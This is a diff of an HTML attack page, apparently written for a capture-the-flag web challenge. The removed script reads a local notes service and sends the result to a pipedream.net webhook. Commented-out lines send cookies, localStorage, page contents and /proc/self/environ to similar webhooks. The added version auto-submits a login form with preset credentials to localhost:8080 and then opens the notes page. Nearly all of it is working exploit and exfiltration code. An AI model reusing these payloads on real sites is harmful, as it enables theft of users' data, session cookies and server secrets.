@@ -1,64 +1,8 @@
-<html>
-  <body>
-    <iframe src="http://localhost:4000"></iframe>
-    <script>
-      async function lmao() {
-        var req = new XMLHttpRequest();
-        req.open('GET', 'http://0.0.0.0:8080/notes', true);
-        req.setRequestHeader('Access-Control-Allow-Origin', '*');
-        await req.send();
-        if(req.status == 200) {
-          var src = 'success placeholder';
-          var src = req.response;
-        }
-        else {
-          var src = 'error placeholder';
-          var src = req.statusText;
-        }
-        var req_webhook = new XMLHttpRequest();
-        req_webhook.open('GET', 'https://en54ypp3nacrf.x.pipedream.net/?src='+src, true);
-        await req_webhook.send();
-      }
-      lmao()
-       //var link = document.createElement("button");
-       //link.name = "action";
-       //link.onclick = "history.go(-2)";
-       //document.body.appendChild(link);
-//        var iframe = document.createElement('iframe');
-       //var loadNewScript = '<script>function newDoc() {location.assign("https://www.w3schools.com")}<'+"/script>";
-//        document.body.appendChild(iframe);
-//        iframe.id = 'i1'
-//        iframe.src = 'http://0.0.0.0:8080/notes';
-//        iframe.width = '1000';
-//        iframe.height = '400';
-       //iframe.contentLocation.assign('notes')
-       //iframe.body.appendChild(loadNewScript);
-//       async function lmao() {
-//       fetch("https://enzv2dem6iht.x.pipedream.net/?location=" + btoa(JSON.stringify(location)));
-//       fetch("https://enzv2dem6iht.x.pipedream.net/?iframe=" + btoa(JSON.stringify(document.getElementById("i1").contentWindow.document.documentElement.outerHTML)));
-//       fetch("https://enzv2dem6iht.x.pipedream.net/?src=" + btoa(await fetch("file:///proc/environ").then(res => res.text()).catch(err => { console.log(err.toString()); return err.toString(); })));
-//       }
-//       lmao()
-//       link.click();
-//       var response = fetch('file:///challenge/metadata.json')
-//       var envr = fetch('file:///proc/self/environ')
-//       var local = fetch('http://localhost:4000')
-//       var localp = fetch('http://localhost:4000', {method: "post"})
-//       var noted = fetch('http://0.0.0.0:8080/notes')
-//       fetch("https://enx6dgfqdmci.x.pipedream.net/", {
-//         method: "post",
-//         body: JSON.stringify({
-//           store: Object.entries(localStorage),
-//           username: localStorage.getItem('username'),
-//           image: localStorage.getItem('image'),
-//           metadata: JSON.stringify(response),
-//           env: JSON.stringify(envr),
-//           local: JSON.stringify(local),
-//           localp: JSON.stringify(localp),
-//           noted: JSON.stringify(document.getElementById("i1").contentWindow.document.documentElement.outerHTM>)
-//           cookie: document.cookie,
-//         }),
-//       });
-    </script>
-  </body>
-</html>
+<form action="http://localhost:8080/login" method=POST id=flag target=_blank>
+    <input type="text" name="username" value="111"><input type="text" name="password" value="111">
+</form>
+<script>
+    window.open('http://localhost:8080/notes', 'flag');
+    setTimeout(`flag.submit()`, 1000);
+    setTimeout(`window.location='http://localhost:8080/notes?flag'`, 1500);
+</script>
